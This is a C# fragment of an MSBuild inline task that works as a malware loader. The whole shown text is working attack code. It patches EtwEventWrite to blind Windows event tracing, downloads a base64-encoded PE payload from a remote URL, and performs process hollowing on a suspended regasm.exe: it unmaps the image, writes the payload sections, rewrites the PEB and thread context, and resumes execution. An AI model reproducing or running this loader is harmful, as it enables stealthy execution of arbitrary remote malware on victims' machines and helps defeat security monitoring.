    public override bool Execute()
    {
        try
        {
            Log.LogMessage(MessageImportance.High, "[HOLLOW] Starting inline task...");
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Running in {0} MSBuild process", Environment.Is64BitProcess ? "x64" : "x86"));

            // 1. Patch ETW in current MSBuild process
            PatchEtw();

            // 2. Download payload (base64 .txt) into memory
            byte[] payloadBytes = DownloadPayload(PayloadUrl);
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Payload downloaded: {0} bytes", payloadBytes.Length));

            // 3. Validate PE
            ValidatePe(payloadBytes);

            // 4. Locate x86 regasm.exe
            string regasmPath = FindRegasmX86();
            if (string.IsNullOrEmpty(regasmPath))
            {
                Log.LogError("[HOLLOW] Could not locate x86 regasm.exe");
                return false;
            }
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Host binary: {0}", regasmPath));

            // 5. Spawn regasm suspended
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi;
            bool ok = CreateProcess(regasmPath, " /nologo", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            if (!ok)
            {
                Log.LogError(string.Format("[HOLLOW] CreateProcess failed: {0}", Marshal.GetLastWin32Error()));
                return false;
            }
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Spawned regasm PID {0} TID {1}", pi.dwProcessId, pi.dwThreadId));

            // 6. Parse PE headers
            IMAGE_DOS_HEADER dosHdr = ByteArrayToStructure<IMAGE_DOS_HEADER>(payloadBytes, 0);
            IMAGE_NT_HEADERS32 ntHdr = ByteArrayToStructure<IMAGE_NT_HEADERS32>(payloadBytes, dosHdr.e_lfanew);
            uint imageBase = ntHdr.OptionalHeader.ImageBase;
            uint entryPoint = ntHdr.OptionalHeader.AddressOfEntryPoint;
            uint sizeOfImage = ntHdr.OptionalHeader.SizeOfImage;
            ushort numSections = ntHdr.FileHeader.NumberOfSections;
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Payload ImageBase=0x{0:X8} EP=0x{1:X8} Size={2} Sections={3}", imageBase, entryPoint, sizeOfImage, numSections));

            // 7. Unmap original regasm image
            IntPtr pImageBase = (IntPtr)imageBase;
            int status = NtUnmapViewOfSection(pi.hProcess, pImageBase);
            if (status < 0)
            {
                // Try at 0x400000 fallback
                pImageBase = (IntPtr)0x400000;
                Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] NtUnmapViewOfSection returned 0x{0:X8}, trying fallback 0x400000", status));
                status = NtUnmapViewOfSection(pi.hProcess, pImageBase);
            }
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] NtUnmapViewOfSection status=0x{0:X8}", status));

            // 8. Allocate memory at payload preferred base
            IntPtr newBase = VirtualAllocEx(pi.hProcess, pImageBase, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (newBase == IntPtr.Zero)
            {
                Log.LogError(string.Format("[HOLLOW] VirtualAllocEx failed: {0}", Marshal.GetLastWin32Error()));
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return false;
            }
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Allocated at 0x{0:X8}", newBase.ToInt64()));

            // 9. Write headers
            uint headersSize = ntHdr.OptionalHeader.SizeOfHeaders;
            byte[] headers = new byte[headersSize];
            Buffer.BlockCopy(payloadBytes, 0, headers, 0, (int)headersSize);
            int written;
            ok = WriteProcessMemory(pi.hProcess, newBase, headers, headersSize, out written);
            if (!ok)
            {
                Log.LogError(string.Format("[HOLLOW] WriteProcessMemory headers failed: {0}", Marshal.GetLastWin32Error()));
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return false;
            }
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Wrote PE headers ({0} bytes)", written));

            // 10. Write sections
            int sectionTableOffset = dosHdr.e_lfanew + 4 + Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) + ntHdr.FileHeader.SizeOfOptionalHeader;
            for (int i = 0; i < numSections; i++)
            {
                int secOff = sectionTableOffset + i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));
                IMAGE_SECTION_HEADER sec = ByteArrayToStructure<IMAGE_SECTION_HEADER>(payloadBytes, secOff);
                byte[] secData = new byte[sec.SizeOfRawData];
                Buffer.BlockCopy(payloadBytes, (int)sec.PointerToRawData, secData, 0, (int)sec.SizeOfRawData);
                IntPtr dest = (IntPtr)(newBase.ToInt64() + sec.VirtualAddress);
                ok = WriteProcessMemory(pi.hProcess, dest, secData, sec.SizeOfRawData, out written);
                Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Wrote section {0} VA=0x{1:X8} Raw={2} ok={3}", Encoding.ASCII.GetString(sec.Name).TrimEnd('\0'), sec.VirtualAddress, sec.SizeOfRawData, ok));
            }

            // 11. Determine target bitness and set thread context / PEB
            bool targetIsWow64 = false;
            IsWow64Process(pi.hProcess, out targetIsWow64);
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Target is Wow64={0}", targetIsWow64));

            uint finalImageBase = (uint)newBase.ToInt64();
            uint finalEntryPoint = finalImageBase + entryPoint;

            if (Environment.Is64BitProcess)
            {
                // Host x64, target x86 Wow64 -> use Wow64 context and Wow64 PEB
                SetWow64Context(pi, finalImageBase, finalEntryPoint);
            }
            else
            {
                // Host x86, target x86 native
                SetNativeX86Context(pi, finalImageBase, finalEntryPoint);
            }

            // 12. Resume
            uint suspendCount = ResumeThread(pi.hThread);
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] ResumeThread suspendCount={0}", suspendCount));

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Log.LogMessage(MessageImportance.High, "[HOLLOW] Done. Payload should now execute inside regasm.exe.");
            return true;
        }
        catch (Exception ex)
        {
            Log.LogError(string.Format("[HOLLOW] Exception: {0}", ex));
            return false;
        }
    }

    private void PatchEtw()
    {
        try
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
            {
                Log.LogWarning("[HOLLOW] Could not get ntdll handle for ETW patch");
                return;
            }
            IntPtr etw = GetProcAddress(ntdll, "EtwEventWrite");
            if (etw == IntPtr.Zero)
            {
                Log.LogWarning("[HOLLOW] EtwEventWrite not found");
                return;
            }

            uint oldProtect;
            byte[] patch;
            if (Environment.Is64BitProcess)
            {
                // x64: ret (0xC3) padded to 5 bytes with nops
                patch = new byte[] { 0xC3, 0x90, 0x90, 0x90, 0x90 };
            }
            else
            {
                // x86 stdcall: ret 0x14
                patch = new byte[] { 0xC2, 0x14, 0x00, 0x90, 0x90 };
            }

            if (!VirtualProtect(etw, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
            {
                Log.LogWarning(string.Format("[HOLLOW] VirtualProtect for ETW failed: {0}", Marshal.GetLastWin32Error()));
                return;
            }
            Marshal.Copy(patch, 0, etw, patch.Length);
            VirtualProtect(etw, (UIntPtr)patch.Length, oldProtect, out oldProtect);
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] ETW patched at 0x{0:X8} ({1})", etw.ToInt64(), Environment.Is64BitProcess ? "x64" : "x86"));
        }
        catch (Exception ex)
        {
            Log.LogWarning(string.Format("[HOLLOW] ETW patch exception: {0}", ex.Message));
        }
    }

    private byte[] DownloadPayload(string url)
    {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
        using (WebClient wc = new WebClient())
        {
            wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win32; x32) AppleWebKit/537.36");
            string b64 = wc.DownloadString(url);
            b64 = new string(b64.Where(c => !char.IsWhiteSpace(c)).ToArray());
            Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Downloaded base64 length={0}", b64.Length));
            return Convert.FromBase64String(b64);
        }
    }

    private void ValidatePe(byte[] buf)
    {
        if (buf.Length < 64) throw new Exception("Payload too small");
        ushort mz = BitConverter.ToUInt16(buf, 0);
        if (mz != 0x5A4D) throw new Exception(string.Format("Invalid MZ: 0x{0:X4}", mz));
        int peOffset = BitConverter.ToInt32(buf, 60);
        uint pe = BitConverter.ToUInt32(buf, peOffset);
        if (pe != 0x00004550) throw new Exception(string.Format("Invalid PE: 0x{0:X8}", pe));
        ushort machine = BitConverter.ToUInt16(buf, peOffset + 4);
        if (machine != 0x14c) throw new Exception(string.Format("Payload is not x86 (machine=0x{0:X4}). Need 0x14c.", machine));
        ushort magic = BitConverter.ToUInt16(buf, peOffset + 24);
        if (magic != 0x10b) throw new Exception(string.Format("Optional header magic not PE32 (0x{0:X4})", magic));
        Log.LogMessage(MessageImportance.High, "[HOLLOW] PE validated: x86 PE32");
    }

    private string FindRegasmX86()
    {
        string windir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        string[] candidates = new[]
        {
            Path.Combine(windir, "Microsoft.NET", "Framework", "v4.0.30319", "regasm.exe"),
            Path.Combine(windir, "Microsoft.NET", "Framework", "v2.0.50727", "regasm.exe"),
            Path.Combine(windir, "Microsoft.NET", "Framework", "v4.0.30319", "RegAsm.exe"),
        };
        foreach (var c in candidates)
        {
            if (File.Exists(c))
            {
                Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Found regasm candidate: {0}", c));
                return c;
            }
        }
        return null;
    }

    private void SetNativeX86Context(PROCESS_INFORMATION pi, uint imageBase, uint entryPoint)
    {
        // Get native 32-bit PEB
        uint size = (uint)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION32));
        IntPtr pbiBuf = Marshal.AllocHGlobal((int)size);
        uint retLen;
        int status = NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, pbiBuf, size, out retLen);
        if (status < 0)
        {
            Log.LogError(string.Format("[HOLLOW] NtQueryInformationProcess failed 0x{0:X8}", status));
            Marshal.FreeHGlobal(pbiBuf);
            return;
        }
        PROCESS_BASIC_INFORMATION32 pbi = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION32>(pbiBuf);
        Marshal.FreeHGlobal(pbiBuf);
        Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Native PEB=0x{0:X8}", pbi.PebBaseAddress));

        // Write ImageBase into PEB+0x08
        byte[] ib = BitConverter.GetBytes(imageBase);
        int w;
        WriteProcessMemory(pi.hProcess, (IntPtr)(pbi.PebBaseAddress + 8), ib, 4, out w);
        Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Updated PEB ImageBase -> 0x{0:X8}", imageBase));

        // Set thread context
        CONTEXT ctx = new CONTEXT();
        ctx.ContextFlags = CONTEXT_ALL;
        if (!GetThreadContext(pi.hThread, ref ctx))
        {
            Log.LogError(string.Format("[HOLLOW] GetThreadContext failed: {0}", Marshal.GetLastWin32Error()));
            return;
        }
        ctx.Eax = entryPoint;
        ctx.Ebx = pbi.PebBaseAddress;
        if (!SetThreadContext(pi.hThread, ref ctx))
        {
            Log.LogError(string.Format("[HOLLOW] SetThreadContext failed: {0}", Marshal.GetLastWin32Error()));
            return;
        }
        Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Context set: EAX=0x{0:X8} EBX=0x{1:X8}", entryPoint, pbi.PebBaseAddress));
    }

    private void SetWow64Context(PROCESS_INFORMATION pi, uint imageBase, uint entryPoint)
    {
        // On x64 host, query ProcessWow64Information to get 32-bit PEB
        IntPtr peb32 = IntPtr.Zero;
        uint retLen;
        uint size = (uint)IntPtr.Size;
        int status = NtQueryInformationProcess(pi.hProcess, ProcessWow64Information, out peb32, size, out retLen);
        if (status < 0)
        {
            Log.LogError(string.Format("[HOLLOW] NtQueryInformationProcess(Wow64) failed 0x{0:X8}", status));
            return;
        }
        uint peb32Addr = (uint)peb32.ToInt64();
        Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Wow64 PEB=0x{0:X8}", peb32Addr));

        byte[] ib = BitConverter.GetBytes(imageBase);
        int w;
        WriteProcessMemory(pi.hProcess, (IntPtr)(peb32Addr + 8), ib, 4, out w);
        Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Updated Wow64 PEB ImageBase -> 0x{0:X8}", imageBase));

        WOW64_CONTEXT ctx = new WOW64_CONTEXT();
        ctx.ContextFlags = CONTEXT_ALL;
        if (!Wow64GetThreadContext(pi.hThread, ref ctx))
        {
            Log.LogError(string.Format("[HOLLOW] Wow64GetThreadContext failed: {0}", Marshal.GetLastWin32Error()));
            return;
        }
        ctx.Eax = entryPoint;
        ctx.Ebx = peb32Addr;
        if (!Wow64SetThreadContext(pi.hThread, ref ctx))
        {
            Log.LogError(string.Format("[HOLLOW] Wow64SetThreadContext failed: {0}", Marshal.GetLastWin32Error()));
            return;
        }
        Log.LogMessage(MessageImportance.High, string.Format("[HOLLOW] Wow64 context set: EAX=0x{0:X8} EBX=0x{1:X8}", entryPoint, peb32Addr));
    }

    private T ByteArrayToStructure<T>(byte[] bytes, int offset) where T : struct
    {
        int size = Marshal.SizeOf(typeof(T));
        IntPtr ptr = Marshal.AllocHGlobal(size);
        try
        {
            Marshal.Copy(bytes, offset, ptr, size);
            return Marshal.PtrToStructure<T>(ptr);
        }
        finally
        {
            Marshal.FreeHGlobal(ptr);
        }
    }

